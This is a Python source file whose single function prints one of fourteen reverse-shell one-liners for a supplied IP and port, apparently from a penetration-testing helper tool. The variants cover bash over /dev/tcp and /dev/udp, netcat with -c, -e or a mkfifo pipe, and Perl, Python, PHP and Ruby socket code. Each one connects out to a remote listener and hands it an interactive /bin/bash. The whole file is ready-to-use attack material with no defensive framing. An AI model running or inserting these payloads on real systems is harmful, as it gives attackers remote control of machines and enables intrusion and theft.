def reverse_shell(shell_id, user_ip, user_port):
    if shell_id == '1':
        print(f"bash -i >& /dev/tcp/{user_ip}/{user_port} 0>&1")
    elif shell_id == '2':
        print(f"bash -i >& /dev/udp/{user_ip}/{user_port} 0>&1")
    elif shell_id == '3':
        print(f"nc -c /bin/bash {user_ip} {user_port}")
    elif shell_id == '4':
        print(f"nc -e /bin/bash {user_ip} {user_port}")
    elif shell_id == '5':
        print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {user_ip} {user_port} >/tmp/f")
    elif shell_id == '6':
        print("perl -e 'use Socket;$i=" + f'"{user_ip}"' + f";$p={user_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname"     + '("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' + '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec    ("/bin/bash -i");' + "};'")
    elif shell_id == '7':
        print("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + f'"{user_ip}",{user_port}' + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("     + '"/bin/bash"' + ")'")
    elif shell_id == '8':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}"' + f',{user_port});exec("/bin/bash -i <&3 >&3 2>&3")' + ";'")
    elif shell_id == '9':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}"' + f',{user_port});shell_exec("/bin/bash -i <&3 >&3 2>&3")' + ";'")
    elif shell_id == '10':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}"' + f",{user_port});`/bin/bash -i <&3 >&3 2>&3`;'")
    elif shell_id == '11':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}"' + f',{user_port});system("/bin/bash -i <&3 >&3 2>&3")' + ";'")
    elif shell_id == '12':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}"' + f',{user_port});passthru("/bin/bash -i <&3 >&3 2>&3")' + ";'")
    elif shell_id == '13':
        print("php -r '$sock=fsockopen(" + f'"{user_ip}",{user_port});popen(' + '"/bin/bash -i <&3 >&3 2>&3", "r");' + "'")
    elif shell_id == '14':
        print("ruby -rsocket -e'f=TCPSocket.open" + f'("{user_ip}",{user_port}).to_i;exec sprintf' + '("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)' + "'")
    else:
        print("Invalid Arguments")
